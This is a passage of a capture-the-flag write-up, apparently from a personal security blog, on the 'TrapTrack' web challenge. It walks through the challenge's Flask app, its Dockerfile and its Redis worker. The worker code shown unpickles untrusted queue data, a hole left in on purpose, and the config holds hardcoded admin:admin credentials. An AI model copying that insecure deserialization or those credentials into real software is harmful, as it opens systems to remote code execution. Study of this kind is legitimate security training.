<!doctype html><html lang="es"><head><title>TrapTrack | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Insecure Deserialization in `pickle`. SSRF in Redis"><meta itemprop="description" content="Insecure Deserialization in `pickle`. SSRF in Redis"><meta name="twitter:card" content="Insecure Deserialization in `pickle`. SSRF in Redis"><meta name="twitter:description" content="Insecure Deserialization in `pickle`. SSRF in Redis"><meta property="og:description" content="Insecure Deserialization in `pickle`. SSRF in Redis"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="TrapTrack"><meta property="twitter:title" content="TrapTrack"><meta property="og:title" content="TrapTrack"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/traptrack/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/htb-cyber-apocalypse-2023/traptrack/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE 2023</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/traptrack/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/traptrack/&amp;text=TrapTrack" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/traptrack/&amp;title=TrapTrack" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">TrapTrack</h1><p class="mb4 f6 dib tracked">9 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#website-functionality">Website functionality</a></li><li><a href="#application-infrastructure">Application infrastructure</a></li><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#finding-the-objective">Finding the objective</a></li><li><a href="#worker">Worker</a></li><li><a href="#flask-web-application">Flask web application</a></li></ul></li><li><a href="#getting-rce">Getting RCE</a><ul><li><a href="#insecure-deserialization-in-pickle">Insecure deserialization in <code>pickle</code></a></li><li><a href="#ssrf-to-redis">SSRF to Redis</a></li><li><a href="#overkill-strategy">Overkill strategy</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a website like this:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-1.png" alt="TrapTrack 1"></p><p>We are also given the source code of the project.</p><h2 id="website-functionality">Website functionality</h2><p>The web application allows us to enter URLs that will be stored in a SQLite database. Just reading the code from <code>challenge/application/config.py</code>, we have valid credentials (<code>admin:admin</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">application</span><span class="mtk1">.</span><span class="mtk8 mtku">util</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk1">generate</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span>

<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Config</span><span class="mtk1">(</span><span class="mtk8 mtku">object</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">SECRET_KEY</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">generate</span><span class="mtk1">(</span><span class="mtk6">50</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">ADMIN_USERNAME</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'admin'</span>
<span class="mtk1">    </span><span class="mtk1">ADMIN_PASSWORD</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'admin'</span>
<span class="mtk1">    </span><span class="mtk1">SESSION_PERMANENT</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">    </span><span class="mtk1">SESSION_TYPE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'filesystem'</span>
<span class="mtk1">    </span><span class="mtk1">SQLALCHEMY_DATABASE_URI</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'sqlite:////tmp/database.db'</span>  
<span class="mtk1">    </span><span class="mtk1">REDIS_HOST</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'127.0.0.1'</span>
<span class="mtk1">    </span><span class="mtk1">REDIS_PORT</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">6379</span>
<span class="mtk1">    </span><span class="mtk1">REDIS_JOBS</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'jobs'</span>
<span class="mtk1">    </span><span class="mtk1">REDIS_QUEUE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'jobqueue'</span>
<span class="mtk1">    </span><span class="mtk1">REDIS_NUM_JOBS</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">100</span>

<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">ProductionConfig</span><span class="mtk1">(</span><span class="mtk8 mtku">Config</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">pass</span>

<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">DevelopmentConfig</span><span class="mtk1">(</span><span class="mtk8 mtku">Config</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">DEBUG</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">True</span>

<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">TestingConfig</span><span class="mtk1">(</span><span class="mtk8 mtku">Config</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">TESTING</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">True</span>
</code></pre></div><p>So we can access to the main panel:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-2.png" alt="TrapTrack 2"></p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-3.png" alt="TrapTrack 3"></p><p>The web application allows us to store some websites:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-4.png" alt="TrapTrack 4"></p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-5.png" alt="TrapTrack 5"></p><p>As can be seen, the new websites have a red dot that indicates that the web is not active or has not been tested yet. Behind the hood, the worker takes the URL and performs a request. If the response is successful, then the dot is updated to green:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-6.png" alt="TrapTrack 6"></p><p>Moreover, using Burp Suite, we can find out that the website frontend performs an AJAX request to tell the health of the listed websites:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-7.png" alt="TrapTrack 7"></p><h2 id="application-infrastructure">Application infrastructure</h2><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-8.png" alt="TrapTrack 8"></p><h2 id="source-code-analysis">Source code analysis</h2><p>There are a lot of files to analyze:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span>
.
├── Dockerfile
├── build-docker.sh
├── config
│   ├── readflag.c
│   ├── redis.conf
│   └── supervisord.conf
├── challenge
│   ├── application
│   │   ├── blueprints
│   │   │   └── routes.py
│   │   ├── cache.py
│   │   ├── config.py
│   │   ├── database.py
│   │   ├── main.py
│   │   ├── static
│   │   │   ├── css
│   │   │   │   ├── bootstrap.min.css
│   │   │   │   ├── login.css
│   │   │   │   ├── main.css
│   │   │   │   └── theme.css
│   │   │   ├── images
│   │   │   │   └── logo.png
│   │   │   └── js
│   │   │       ├── auth.js
│   │   │       ├── bootstrap.min.js
│   │   │       ├── jquery-3.6.0.min.js  
│   │   │       └── main.js
│   │   ├── templates
│   │   │   ├── admin.html
│   │   │   └── login.html
│   │   └── util.py
│   ├── flask_session
│   ├── instance
│   ├── requirements.txt
│   ├── run.py
│   └── worker
│       ├── healthcheck.py
│       └── main.py
└── flag.txt

13 directories, 27 files
</code></pre></div><p>Plus, two separate projects are running at the same time (a Flask server inside <code>application</code> and a worker at <code>worker</code>).</p><h3 id="finding-the-objective">Finding the objective</h3><p>Looking at the <code>Dockerfile</code>, we see that <code>flag.txt</code> will be located at <code>/root/flag.txt</code> and a SUID binary called <code>readflag</code> will be available to let us read the flag as long as we can execute commands on the server. Therefore, the aim of this challenge is to obtain Remote Code Execution (RCE) to read the flag:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> </span><span class="mtk8 mtku detected-link">python</span><span class="mtk1">:</span><span class="mtk1">3.8.14-buster</span>

<span class="mtk3"># Install packages</span>
<span class="mtk5">RUN</span><span class="mtk1"> </span><span class="mtk9 mtki">apt-get</span><span class="mtk1"> </span><span class="mtk9 mtki">update</span><span class="mtk1"> </span><span class="mtk8">\</span>
<span class="mtk1">    </span><span class="mtk9 mtki">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk9 mtki">apt-get</span><span class="mtk1"> </span><span class="mtk9 mtki">install</span><span class="mtk1"> </span><span class="mtk9 mtki">-y</span><span class="mtk1"> </span><span class="mtk9 mtki">supervisor</span><span class="mtk1"> </span><span class="mtk9 mtki">gnupg</span><span class="mtk1"> </span><span class="mtk9 mtki">sqlite3</span><span class="mtk1"> </span><span class="mtk9 mtki">libcurl4-openssl-dev</span><span class="mtk1"> </span><span class="mtk9 mtki">python3-dev</span><span class="mtk1"> </span><span class="mtk9 mtki">python3-pycurl</span><span class="mtk1"> </span><span class="mtk9 mtki">psmisc</span><span class="mtk1"> </span><span class="mtk9 mtki">redis</span><span class="mtk1"> </span><span class="mtk9 mtki">gcc</span><span class="mtk1"> </span><span class="mtk8">\</span>  
<span class="mtk1">    </span><span class="mtk9 mtki">--no-install-recommends</span><span class="mtk1"> </span><span class="mtk8">\</span>
<span class="mtk1">    </span><span class="mtk9 mtki">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk9 mtki">rm</span><span class="mtk1"> </span><span class="mtk9 mtki">-rf</span><span class="mtk1"> </span><span class="mtk9 mtki">/var/lib/apt/lists/*</span>

<span class="mtk3"># Upgrade pip</span>
<span class="mtk5">RUN</span><span class="mtk1"> </span><span class="mtk9 mtki">python</span><span class="mtk1"> </span><span class="mtk9 mtki">-m</span><span class="mtk1"> </span><span class="mtk9 mtki">pip</span><span class="mtk1"> </span><span class="mtk9 mtki">install</span><span class="mtk1"> </span><span class="mtk9 mtki">--upgrade</span><span class="mtk1"> </span><span class="mtk9 mtki">pip</span>

<span class="mtk3"># Copy flag</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">flag.txt</span><span class="mtk1"> </span><span class="mtk9 mtki">/root/flag</span>

<span class="mtk3"># Setup app</span>
<span class="mtk5">RUN</span><span class="mtk1"> </span><span class="mtk9 mtki">mkdir</span><span class="mtk1"> </span><span class="mtk9 mtki">-p</span><span class="mtk1"> </span><span class="mtk9 mtki">/app</span>

<span class="mtk3"># Switch working environment</span>
<span class="mtk5">WORKDIR</span><span class="mtk1"> </span><span class="mtk9 mtki">/app</span>

<span class="mtk3"># Add application</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">challenge</span><span class="mtk1"> </span><span class="mtk9 mtki">.</span>
<span class="mtk5">RUN</span><span class="mtk1"> </span><span class="mtk9 mtki">chown</span><span class="mtk1"> </span><span class="mtk9 mtki">-R</span><span class="mtk1"> </span><span class="mtk9 mtki">www-data:www-data</span><span class="mtk1"> </span><span class="mtk9 mtki">/app/flask_session</span>

<span class="mtk3"># Install dependencies</span>
<span class="mtk5">RUN</span><span class="mtk1"> </span><span class="mtk9 mtki">pip</span><span class="mtk1"> </span><span class="mtk9 mtki">install</span><span class="mtk1"> </span><span class="mtk9 mtki">-r</span><span class="mtk1"> </span><span class="mtk9 mtki">/app/requirements.txt</span>

<span class="mtk3"># Setup config</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">config/supervisord.conf</span><span class="mtk1"> </span><span class="mtk9 mtki">/etc/supervisord.conf</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">config/redis.conf</span><span class="mtk1"> </span><span class="mtk9 mtki">/etc/redis/redis.conf</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">config/readflag.c</span><span class="mtk1"> </span><span class="mtk9 mtki">/</span>

<span class="mtk3"># Setup flag reader</span>
<span class="mtk5">RUN</span><span class="mtk1"> </span><span class="mtk9 mtki">gcc</span><span class="mtk1"> </span><span class="mtk9 mtki">-o</span><span class="mtk1"> </span><span class="mtk9 mtki">/readflag</span><span class="mtk1"> </span><span class="mtk9 mtki">/readflag.c</span><span class="mtk1"> </span><span class="mtk9 mtki">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk9 mtki">chmod</span><span class="mtk1"> </span><span class="mtk9 mtki">4755</span><span class="mtk1"> </span><span class="mtk9 mtki">/readflag</span><span class="mtk1"> </span><span class="mtk9 mtki">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk9 mtki">rm</span><span class="mtk1"> </span><span class="mtk9 mtki">/readflag.c</span>

<span class="mtk3"># Expose port the server is reachable on</span>
<span class="mtk5">EXPOSE</span><span class="mtk1"> </span><span class="mtk9 mtki">1337</span>

<span class="mtk3"># Disable pycache</span>
<span class="mtk5">ENV</span><span class="mtk1"> </span><span class="mtk1">PYTHONDONTWRITEBYTECODE</span><span class="mtk5">=</span><span class="mtk9 mtki">1</span>

<span class="mtk3"># Run supervisord</span>
<span class="mtk5">CMD</span><span class="mtk1"> </span><span class="mtk9 mtki">[</span><span class="mtk4">"/usr/bin/supervisord"</span><span class="mtk9 mtki">,</span><span class="mtk1"> </span><span class="mtk4">"-c"</span><span class="mtk9 mtki">,</span><span class="mtk1"> </span><span class="mtk4">"/etc/supervisord.conf"</span><span class="mtk9 mtki">]</span>
</code></pre></div><p>Moreover, all directories are owned by <code>root</code> except for <code>/app/flask_session</code> (which is interesting, and reminded me to <a href="https://www.hackthebox.com/blog/acnologia-portal-ca-ctf-2022-web-writeup">Acnologia Portal</a> from HTB Cyber Apocalypse 2022). This is important because we won&rsquo;t be able to move the flag file to a public directory, because we don&rsquo;t have write permissions.</p><h3 id="worker">Worker</h3><p>I started looking at the worker. Basically, the worker connects to a Redis server that contains a message queue:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">redis</span><span class="mtk1">, </span><span class="mtk8 mtku">pickle</span><span class="mtk1">, </span><span class="mtk8 mtku">time</span><span class="mtk1">, </span><span class="mtk8 mtku">base64</span>
<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">healthcheck</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8">request</span>

<span class="mtk1">config</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk4">'REDIS_HOST'</span><span class="mtk1"> : </span><span class="mtk4">'127.0.0.1'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">'REDIS_PORT'</span><span class="mtk1"> : </span><span class="mtk6">6379</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1"> : </span><span class="mtk4">'jobs'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">'REDIS_QUEUE'</span><span class="mtk1"> : </span><span class="mtk4">'jobqueue'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">'REDIS_NUM_JOBS'</span><span class="mtk1"> : </span><span class="mtk6">100</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk9 mtki">key</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">val</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">val</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">config</span><span class="mtk1">[</span><span class="mtk9 mtki">key</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk5">finally</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">val</span>

<span class="mtk1">store</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">redis</span><span class="mtk1">.</span><span class="mtk1">StrictRedis</span><span class="mtk1">(</span><span class="mtk9 mtki">host</span><span class="mtk5">=</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_HOST'</span><span class="mtk1">), </span><span class="mtk9 mtki">port</span><span class="mtk5">=</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_PORT'</span><span class="mtk1">), </span><span class="mtk9 mtki">db</span><span class="mtk5">=</span><span class="mtk6">0</span><span class="mtk1">)</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_work_item</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">job_id</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">store</span><span class="mtk1">.</span><span class="mtk8">rpop</span><span class="mtk1">(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_QUEUE'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">job_id</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>

<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">store</span><span class="mtk1">.</span><span class="mtk8">hget</span><span class="mtk1">(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1">), </span><span class="mtk1">job_id</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">job</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">loads</span><span class="mtk1">(</span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64decode</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">))</span>
